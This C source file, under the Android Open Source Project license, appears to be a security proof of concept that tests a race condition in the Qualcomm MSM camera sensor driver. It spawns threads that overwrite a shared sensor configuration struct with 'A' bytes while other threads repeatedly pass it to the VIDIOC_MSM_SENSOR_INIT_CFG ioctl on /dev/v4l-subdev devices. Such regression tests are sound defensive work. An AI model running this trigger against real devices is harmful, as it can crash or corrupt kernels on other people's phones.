/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <string.h>

#include <android/log.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/ptrace.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/system_properties.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
typedef signed char s8;
typedef unsigned char u8;

typedef signed short s16;
typedef unsigned short u16;

typedef signed int s32;
typedef unsigned int u32;

typedef signed long long s64;
typedef unsigned long long u64;

#define MAX_SENSOR_NAME 32
#define MAX_POWER_CONFIG 12

enum sensor_sub_module_t {
  SUB_MODULE_SENSOR,
  SUB_MODULE_CHROMATIX,
  SUB_MODULE_ACTUATOR,
  SUB_MODULE_EEPROM,
  SUB_MODULE_LED_FLASH,
  SUB_MODULE_STROBE_FLASH,
  SUB_MODULE_CSID,
  SUB_MODULE_CSID_3D,
  SUB_MODULE_CSIPHY,
  SUB_MODULE_CSIPHY_3D,
  SUB_MODULE_OIS,
  SUB_MODULE_EXT,
  SUB_MODULE_MAX,
};

enum msm_sensor_init_cfg_type_t {
  CFG_SINIT_PROBE,
  CFG_SINIT_PROBE_DONE,
  CFG_SINIT_PROBE_WAIT_DONE,
};

enum camb_position_t {
  BACK_CAMERA_B,
  FRONT_CAMERA_B,
  AUX_CAMERA_B = 0x100,
  INVALID_CAMERA_B,
};

enum msm_sensor_camera_id_t {
  CAMERA_0,
  CAMERA_1,
  CAMERA_2,
  CAMERA_3,
  MAX_CAMERAS,
};

enum i2c_freq_mode_t {
  I2C_STANDARD_MODE,
  I2C_FAST_MODE,
  I2C_CUSTOM_MODE,
  I2C_CUSTOM1_MODE,
  I2C_CUSTOM2_MODE,
  I2C_FAST_PLUS_MODE,
  I2C_MAX_MODES,
};

enum msm_camera_i2c_reg_addr_type {
  MSM_CAMERA_I2C_BYTE_ADDR = 1,
  MSM_CAMERA_I2C_WORD_ADDR,
  MSM_CAMERA_I2C_3B_ADDR,
  MSM_CAMERA_I2C_ADDR_TYPE_MAX,
};

enum msm_sensor_power_seq_type_t {
  SENSOR_CLK,
  SENSOR_GPIO,
  SENSOR_VREG,
  SENSOR_I2C_MUX,
  SENSOR_I2C,
};

enum msm_sensor_output_format_t {
  MSM_SENSOR_BAYER,
  MSM_SENSOR_YCBCR,
  MSM_SENSOR_META,
};

struct msm_sensor_init_params {
  /* mask of modes supported: 2D, 3D */
  int modes_supported;
  /* sensor position: front, back */
  enum camb_position_t position;
  /* sensor mount angle */
  unsigned int sensor_mount_angle;
};

struct msm_sensor_id_info_t {
  unsigned short sensor_id_reg_addr;
  unsigned short sensor_id;
  unsigned short sensor_id_mask;
};

struct msm_sensor_power_setting {
  enum msm_sensor_power_seq_type_t seq_type;
  unsigned short seq_val;
  long config_val;
  unsigned short delay;
  void *data[10];
};

struct msm_sensor_power_setting_array {
  struct msm_sensor_power_setting power_setting_a[MAX_POWER_CONFIG];
  struct msm_sensor_power_setting *power_setting;
  unsigned short size;
  struct msm_sensor_power_setting power_down_setting_a[MAX_POWER_CONFIG];
  struct msm_sensor_power_setting *power_down_setting;
  unsigned short size_down;
};

struct msm_sensor_info_t {
  char sensor_name[MAX_SENSOR_NAME];
  uint32_t session_id;
  int32_t subdev_id[SUB_MODULE_MAX];
  int32_t subdev_intf[SUB_MODULE_MAX];
  uint8_t is_mount_angle_valid;
  uint32_t sensor_mount_angle;
  int modes_supported;
  enum camb_position_t position;
};

struct msm_camera_sensor_slave_info {
  char sensor_name[32];
  char eeprom_name[32];
  char actuator_name[32];
  char ois_name[32];
  char flash_name[32];
  enum msm_sensor_camera_id_t camera_id;
  unsigned short slave_addr;
  enum i2c_freq_mode_t i2c_freq_mode;
  enum msm_camera_i2c_reg_addr_type addr_type;
  struct msm_sensor_id_info_t sensor_id_info;
  struct msm_sensor_power_setting_array power_setting_array;
  unsigned char is_init_params_valid;
  struct msm_sensor_init_params sensor_init_params;
  enum msm_sensor_output_format_t output_format;
};

struct sensor_init_cfg_data {
  enum msm_sensor_init_cfg_type_t cfgtype;
  struct msm_sensor_info_t probed_info;
  char entity_name[MAX_SENSOR_NAME];
  union {
    void *setting;
  } cfg;
};

typedef s16 compat_short_t;
typedef s32 compat_int_t;
typedef s32 compat_long_t;
typedef s64 compat_s64;
typedef u16 compat_ushort_t;
typedef u32 compat_uint_t;
typedef u32 compat_ulong_t;
typedef u64 compat_u64;
typedef u32 compat_uptr_t;

struct msm_sensor_power_setting32 {
  enum msm_sensor_power_seq_type_t seq_type;
  uint16_t seq_val;
  compat_uint_t config_val;
  uint16_t delay;
  compat_uptr_t data[10];
};

struct msm_sensor_power_setting_array32 {
  struct msm_sensor_power_setting32 power_setting_a[MAX_POWER_CONFIG];
  compat_uptr_t power_setting;
  uint16_t size;
  struct msm_sensor_power_setting32 power_down_setting_a[MAX_POWER_CONFIG];
  compat_uptr_t power_down_setting;
  uint16_t size_down;
};

struct msm_camera_sensor_slave_info32 {
  char sensor_name[32];
  char eeprom_name[32];
  char actuator_name[32];
  char ois_name[32];
  char flash_name[32];
  enum msm_sensor_camera_id_t camera_id;
  uint16_t slave_addr;
  enum i2c_freq_mode_t i2c_freq_mode;
  enum msm_camera_i2c_reg_addr_type addr_type;
  struct msm_sensor_id_info_t sensor_id_info;
  struct msm_sensor_power_setting_array32 power_setting_array;
  uint8_t is_init_params_valid;
  struct msm_sensor_init_params sensor_init_params;
  enum msm_sensor_output_format_t output_format;
};

#define BASE_VIDIOC_PRIVATE 192
#define VIDIOC_MSM_SENSOR_INIT_CFG \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 10, struct sensor_init_cfg_data)

struct msm_camera_sensor_slave_info32 slave_info;
int fd;

static void *raceCondition(void *param) {
  while (1) {
    memset(&slave_info, 'A', sizeof(slave_info));
    usleep(50);
  }
}

static void *normalfunc(void *param) {
  while (1) {
    struct sensor_init_cfg_data cfg;
    cfg.cfgtype = CFG_SINIT_PROBE;

    cfg.cfg.setting = &slave_info;
    slave_info.camera_id = CAMERA_2;
    slave_info.power_setting_array.size = 1;

    struct msm_sensor_power_setting power_setting;

    slave_info.power_setting_array.size_down = MAX_POWER_CONFIG;

    struct msm_sensor_power_setting pd[MAX_POWER_CONFIG];
    slave_info.power_setting_array.power_down_setting = 0;

    slave_info.eeprom_name[31] = 0;
    slave_info.actuator_name[31] = 0;
    slave_info.ois_name[31] = 0;
    slave_info.sensor_name[31] = 0;
    slave_info.flash_name[31] = 0;
    slave_info.i2c_freq_mode = 0x0;
    int ret = ioctl(fd, VIDIOC_MSM_SENSOR_INIT_CFG, &cfg);
  }
}

int function1() {
  char filename[32] = {0};
  for (int i = 0; i < 32; i++) {
    if (snprintf(filename, sizeof(filename), "/dev/v4l-subdev%d", i) < 0) {
      exit(EXIT_FAILURE);
    }

    fd = open(filename, 2);
    if (fd < 0) {
      continue;
    }

    pthread_t raceConditionthread;
    for (int i = 0; i < 1; i++) {
      if (pthread_create(&raceConditionthread, NULL, raceCondition, NULL))
        perror("raceConditionthread raceConditionthread()");
    }

    pthread_t normalthread;
    for (int i = 0; i < 3; i++) {
      if (pthread_create(&normalthread, NULL, normalfunc, NULL))
        perror("normalfunc normalfunc()");
    }
  }
  return 0;
}

int main(int argc, char **argv, char **env) { return function1(); }
